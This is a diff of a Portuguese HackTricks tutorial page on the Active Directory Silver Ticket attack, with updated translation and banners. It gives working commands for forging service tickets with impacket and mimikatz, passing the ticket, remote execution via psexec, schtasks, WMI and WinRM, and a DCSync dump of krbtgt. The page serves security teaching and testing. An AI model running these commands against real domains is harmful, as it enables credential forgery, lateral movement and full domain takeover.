@@ -1,41 +1,39 @@
 # Silver Ticket
 
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Aprenda hacking na AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Outras formas de apoiar o HackTricks:
-
-* Se você quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
-* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
 <figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>
 
-**Dica de recompensa por bugs**: **inscreva-se** no **Intigriti**, uma plataforma de **recompensa por bugs premium criada por hackers, para hackers**! Junte-se a nós em [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoje e comece a ganhar recompensas de até **$100.000**!
+**Bug bounty tip**: **sign up** for **Intigriti**, a premium **bug bounty platform created by hackers, for hackers**! Join us at [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) today, and start earning bounties up to **$100,000**!
 
 {% embed url="https://go.intigriti.com/hacktricks" %}
 
-## Bilhete Silver
+## Silver ticket
 
-O ataque **Bilhete Silver** envolve a exploração de tickets de serviço em ambientes de Active Directory (AD). Este método depende da **aquisição do hash NTLM de uma conta de serviço**, como uma conta de computador, para forjar um Ticket Granting Service (TGS) ticket. Com este ticket forjado, um atacante pode acessar serviços específicos na rede, **fazendo-se passar por qualquer usuário**, geralmente visando privilégios administrativos. É enfatizado que o uso de chaves AES para forjar tickets é mais seguro e menos detectável.
+O ataque **Silver Ticket** envolve a exploração de tickets de serviço em ambientes Active Directory (AD). Este método depende de **adquirir o hash NTLM de uma conta de serviço**, como uma conta de computador, para forjar um ticket de Serviço de Concessão de Ticket (TGS). Com este ticket forjado, um atacante pode acessar serviços específicos na rede, **impersonando qualquer usuário**, geralmente visando privilégios administrativos. É enfatizado que usar chaves AES para forjar tickets é mais seguro e menos detectável.
 
 Para a criação de tickets, diferentes ferramentas são empregadas com base no sistema operacional:
 
-### No Linux
-
+### On Linux
 ```bash
 python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
 export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
 python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
 ```
-
 ### No Windows
-
 ```bash
 # Create the ticket
 mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"
@@ -47,27 +45,26 @@ mimikatz.exe "kerberos::ptt <TICKET_FILE>"
 # Obtain a shell
 .\PsExec.exe -accepteula \\<TARGET> cmd
 ```
-
 O serviço CIFS é destacado como um alvo comum para acessar o sistema de arquivos da vítima, mas outros serviços como HOST e RPCSS também podem ser explorados para tarefas e consultas WMI.
 
 ## Serviços Disponíveis
 
-| Tipo de Serviço                                         | Tickets Silver do Serviço                                                                |
-| ------------------------------------------------------- | ---------------------------------------------------------------------------------------- |
-| WMI                                                     | <p>HOST</p><p>RPCSS</p>                                                                  |
-| PowerShell Remoting                                     | <p>HOST</p><p>HTTP</p><p>Dependendo do SO também:</p><p>WSMAN</p><p>RPCSS</p>            |
-| WinRM                                                   | <p>HOST</p><p>HTTP</p><p>Em algumas ocasiões você pode simplesmente solicitar: WINRM</p> |
-| Tarefas Agendadas                                       | HOST                                                                                     |
-| Compartilhamento de Arquivos do Windows, também psexec  | CIFS                                                                                     |
-| Operações LDAP, incluindo DCSync                        | LDAP                                                                                     |
-| Ferramentas de Administração Remota do Servidor Windows | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                                       |
-| Tickets de Ouro                                         | krbtgt                                                                                   |
+| Tipo de Serviço                            | Serviços Silver Tickets                                                   |
+| ------------------------------------------ | ------------------------------------------------------------------------- |
+| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                 |
+| PowerShell Remoting                       | <p>HOST</p><p>HTTP</p><p>Dependendo do SO também:</p><p>WSMAN</p><p>RPCSS</p> |
+| WinRM                                      | <p>HOST</p><p>HTTP</p><p>Em algumas ocasiões você pode apenas pedir: WINRM</p> |
+| Tarefas Agendadas                         | HOST                                                                     |
+| Compartilhamento de Arquivos do Windows, também psexec | CIFS                                                                     |
+| Operações LDAP, incluindo DCSync         | LDAP                                                                     |
+| Ferramentas de Administração de Servidor Remoto do Windows | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                       |
+| Golden Tickets                             | krbtgt                                                                   |
 
-Usando **Rubeus** você pode **solicitar todos** esses tickets usando o parâmetro:
+Usando **Rubeus** você pode **pedir todos** esses tickets usando o parâmetro:
 
 * `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`
 
-### IDs de Evento de Tickets Silver
+### IDs de Evento de Silver Tickets
 
 * 4624: Logon de Conta
 * 4634: Logoff de Conta
@@ -75,19 +72,17 @@ Usando **Rubeus** você pode **solicitar todos** esses tickets usando o parâmet
 
 ## Abusando de Tickets de Serviço
 
-Nos exemplos a seguir, vamos imaginar que o ticket é obtido se passando pela conta de administrador.
+Nos exemplos a seguir, vamos imaginar que o ticket é recuperado impersonando a conta de administrador.
 
 ### CIFS
 
-Com este ticket, você poderá acessar as pastas `C$` e `ADMIN$` via **SMB** (se estiverem expostas) e copiar arquivos para uma parte do sistema de arquivos remoto apenas fazendo algo como:
-
+Com este ticket, você poderá acessar a pasta `C$` e `ADMIN$` via **SMB** (se estiverem expostas) e copiar arquivos para uma parte do sistema de arquivos remoto apenas fazendo algo como:
 ```bash
 dir \\vulnerable.computer\C$
 dir \\vulnerable.computer\ADMIN$
 copy afile.txt \\vulnerable.computer\C$\Windows\Temp
 ```
-
-Também será possível obter um shell dentro do host ou executar comandos arbitrários usando **psexec**:
+Você também poderá obter um shell dentro do host ou executar comandos arbitrários usando **psexec**:
 
 {% content-ref url="../lateral-movement/psexec-and-winexec.md" %}
 [psexec-and-winexec.md](../lateral-movement/psexec-and-winexec.md)
@@ -96,7 +91,6 @@ Também será possível obter um shell dentro do host ou executar comandos arbit
 ### HOST
 
 Com essa permissão, você pode gerar tarefas agendadas em computadores remotos e executar comandos arbitrários:
-
 ```bash
 #Check you have permissions to use schtasks over a remote server
 schtasks /S some.vuln.pc
@@ -108,11 +102,9 @@ schtasks /query /S some.vuln.pc
 #Run created schtask now
 schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
 ```
-
 ### HOST + RPCSS
 
-Com esses tickets você pode **executar o WMI no sistema da vítima**:
-
+Com esses tickets, você pode **executar WMI no sistema da vítima**:
 ```bash
 #Check you have enough privileges
 Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
@@ -122,40 +114,35 @@ Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlis
 #You can also use wmic
 wmic remote.computer.local list full /format:list
 ```
-
 Encontre **mais informações sobre wmiexec** na seguinte página:
 
-{% content-ref url="../lateral-movement/wmicexec.md" %}
-[wmicexec.md](../lateral-movement/wmicexec.md)
+{% content-ref url="../lateral-movement/wmiexec.md" %}
+[wmiexec.md](../lateral-movement/wmiexec.md)
 {% endcontent-ref %}
 
 ### HOST + WSMAN (WINRM)
 
-Com acesso winrm a um computador, você pode **acessá-lo** e até mesmo obter um PowerShell:
-
+Com acesso winrm a um computador, você pode **acessá-lo** e até obter um PowerShell:
 ```bash
 New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
 ```
-
-Verifique a seguinte página para aprender **mais maneiras de se conectar a um host remoto usando winrm**:
+Verifique a página a seguir para aprender **mais maneiras de se conectar a um host remoto usando winrm**:
 
 {% content-ref url="../lateral-movement/winrm.md" %}
 [winrm.md](../lateral-movement/winrm.md)
 {% endcontent-ref %}
 
 {% hint style="warning" %}
-Note que o **winrm deve estar ativo e ouvindo** no computador remoto para acessá-lo.
+Observe que **winrm deve estar ativo e ouvindo** no computador remoto para acessá-lo.
 {% endhint %}
 
 ### LDAP
 
 Com esse privilégio, você pode despejar o banco de dados do DC usando **DCSync**:
-
 ```
 mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
 ```
-
-**Saiba mais sobre DCSync** na seguinte página:
+**Saiba mais sobre DCSync** na página a seguir:
 
 ## Referências
 
@@ -168,20 +155,21 @@ mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.loc
 
 <figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>
 
-**Dica de recompensa por bugs**: **Inscreva-se** no **Intigriti**, uma plataforma premium de **recompensas por bugs criada por hackers, para hackers**! Junte-se a nós em [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoje e comece a ganhar recompensas de até **$100,000**!
+**Dica de bug bounty**: **inscreva-se** no **Intigriti**, uma plataforma premium de **bug bounty criada por hackers, para hackers**! Junte-se a nós em [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoje e comece a ganhar recompensas de até **$100,000**!
 
 {% embed url="https://go.intigriti.com/hacktricks" %}
 
+{% hint style="success" %}
+Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Aprenda hacking na AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Outras formas de apoiar o HackTricks:
-
-* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
-* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Compartilhe seus truques de hacking enviando PRs para os repositórios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
+* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Compartilhe truques de hacking enviando PRs para os repositórios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
+{% endhint %}
